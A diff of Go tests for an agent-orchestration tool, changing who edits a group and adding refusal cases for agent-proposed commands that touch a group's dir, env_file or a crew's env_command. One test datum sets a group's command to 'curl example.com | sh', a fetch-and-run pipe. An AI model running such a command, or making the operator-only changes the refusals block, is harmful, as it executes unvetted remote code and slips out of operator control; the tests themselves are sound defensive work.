@@ -515,11 +515,11 @@ func TestRunAskGrantIsHeldToTheGrantee(t *testing.T) {
 		want      func(y *askYard) string
 	}{
 		{"an exec group's cmd with SetGroup", "group builders", func(t *testing.T, y *askYard) {
-			if _, err := y.SetGroup(y.ctx, "builders", GroupEdit{Set: map[string]any{"cmd": "curl example.com | sh"}}, "yardmaster"); err != nil {
+			if _, err := y.SetGroup(y.ctx, "builders", GroupEdit{Set: map[string]any{"cmd": "curl example.com | sh"}}, "mckean"); err != nil {
 				t.Fatal(err)
 			}
 		}, func(y *askYard) string {
-			return "ask 1 was written when the group builders was another: its config was changed since (group_set, " + at(y) + ", by yardmaster). "
+			return "ask 1 was written when the group builders was another: its config was changed since (group_set, " + at(y) + ", by mckean). "
 		}},
 		{"a herdr group's prompt with PutGroup", "group reviewers", func(t *testing.T, y *askYard) {
 			if err := y.PutGroup(y.ctx, Group{Name: "reviewers", Runner: "herdr", Config: map[string]any{"kind": "codex", "prompt": "roles/other.md"}}, "yardmaster"); err != nil {
@@ -555,7 +555,7 @@ func TestRunAskGrantIsHeldToTheGrantee(t *testing.T) {
 	y := listYard(t)
 	seq := y.ask(t, listAsk("mckean", "source grant crm read --crew yardmaster"), "yardmaster")
 	if _, err := y.PutCrew(y.ctx, CrewMember{Name: "yardmaster", Runner: "herdr", Dir: "/elsewhere",
-		Config: map[string]any{"kind": "claude", "args": []string{"--careful"}}}, "yardmaster"); err != nil {
+		Config: map[string]any{"kind": "claude", "args": []string{"--careful"}}}, "mckean"); err != nil {
 		t.Fatal(err)
 	}
 	y.sameCard(t, seq, "crew yardmaster")
@@ -718,11 +718,21 @@ func TestRunAskListRefusals(t *testing.T) {
 		{"user set mckean tell=asks,mail,notifications", "mckean is told of notifications, mail and asks outside the yard already, so the command would change nothing"},
 		{"group set builders cmd=true", "group set with cmd=true defines what the yard runs: " + alone},
 		{"group set builders --unset cmd", "group set with --unset cmd defines what the yard runs: " + alone},
+		{"group set builders dir=/tmp", "group set with dir=/tmp defines what the yard runs: " + alone},
+		{"group set builders --unset dir", "group set with --unset dir defines what the yard runs: " + alone},
+		{"group set builders env_file=/tmp/builders.env", "group set with env_file=/tmp/builders.env defines what the yard runs: " + alone},
+		{"group set builders --unset env_file", "group set with --unset env_file defines what the yard runs: " + alone},
 		{"group set builders runner=exec", "group set with runner=exec defines what the yard runs: " + alone},
 		{"group add builders --runner exec --set cmd=make", "group add with runner exec defines what the yard runs: " + alone},
 		{"group add builders --runner=exec --set=cmd=make", "group add with runner exec defines what the yard runs: " + alone},
 		{"group add builders --runner exec --set cmd=make,check", "group add with runner exec defines what the yard runs: " + alone},
 		{"group add builders --runner herdr --set cmd=make", "group add with cmd defines what the yard runs: " + alone},
+		{"group add builders --runner herdr --set dir=/tmp", "group add with dir defines what the yard runs: " + alone},
+		{"group add builders --runner=herdr --set=env_file=/tmp/builders.env", "group add with env_file defines what the yard runs: " + alone},
+		{"crew set yardmaster env_file=/tmp/yardmaster.env", "env_file is the operator's alone, typed in a terminal and never proposed as a run ask"},
+		{"crew set yardmaster env_command=op inject", "env_command is the operator's alone, typed in a terminal and never proposed as a run ask"},
+		{"crew set yardmaster --unset env_file", "env_file is the operator's alone, typed in a terminal and never proposed as a run ask"},
+		{"crew set yardmaster --unset env_command", "env_command is the operator's alone, typed in a terminal and never proposed as a run ask"},
 		{"group set builders runner=herdr", "anything else is run directly, or typed by the operator in a terminal"},
 		// A group that sends beads to a linked yard, and a route to it, are
 		// anyone's to add (PutGroup and AddRoute check no one): the asker's
